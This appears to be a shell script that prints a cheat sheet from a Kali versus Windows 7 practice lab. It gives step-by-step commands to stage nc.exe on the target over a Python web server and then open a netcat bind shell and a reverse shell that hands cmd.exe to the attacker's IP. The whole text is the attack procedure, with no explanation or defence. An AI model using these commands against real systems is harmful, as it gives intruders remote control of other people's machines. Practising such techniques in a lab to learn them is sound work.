echo '
--] BIND SHELL 8

OPERATOR   === KALI         IP === 132
TANGO      === WINDOWS 7    IP === 134

OPERATOR   ==> TASK ==> cd /usr/share/windows-binaries
OPERATOR   ==> TASK ==> python -m SimpleHTTPServer 80
TANGO      ==> TASK ==> open iexplorer at http://IP_OPERATOR/
TANGO      ==> TASK ==> take nc.exe
TANGO      ==> TASK ==> cmd.exe
TANGO      ==> TASK ==> cd Download
TANGO      ==> TASK ==> explorer .
TANGO      ==> TASK ==> nc.exe -nlvp 4444 -e cmd.exe
OPERATOR   ==> TASK ==> nc -nv IP_TANGO 4444
OPERATOR   ==> TASK ==> nc -lvp 4444
TANGO      ==> TASK ==> cmd.exe
TANGO      ==> TASK ==> nc.exe -nv IP_OPERATOR 4444 -e cmd.exe
'
read
clear
